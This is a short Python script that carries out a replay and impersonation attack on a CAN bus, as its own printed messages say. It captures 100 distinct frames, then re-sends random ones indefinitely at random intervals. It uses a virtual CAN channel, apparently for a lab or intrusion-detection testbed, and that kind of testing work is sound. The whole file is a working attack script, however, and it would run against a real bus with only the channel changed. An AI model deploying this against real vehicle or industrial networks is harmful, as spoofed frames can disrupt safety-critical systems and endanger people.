import can
import time
import random

from can_network import VCAN_CHANNEL, CAN_INTERFACE

def listen_to_can_messages(bus):
    messages = []
    
    while len(messages) < 100:
        msg = bus.recv(timeout=0)
        time.sleep(0.01)
        if msg is not None and msg not in messages:
            messages.append(msg)
    
    return list(messages)

def main():
    print("Conducting Impersonation and Replay attack on CAN bus...")
    bus = can.interface.Bus(channel=VCAN_CHANNEL, bustype=CAN_INTERFACE)
    try:
        messages = listen_to_can_messages(bus)

        while True:
            message = random.choice(messages)
            bus.send(message)
            print("Replayed message")

            cooldown = random.uniform(0.001, 1.001)
            time.sleep(cooldown)
    except KeyboardInterrupt:
        print("Impersonation and Replay attack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
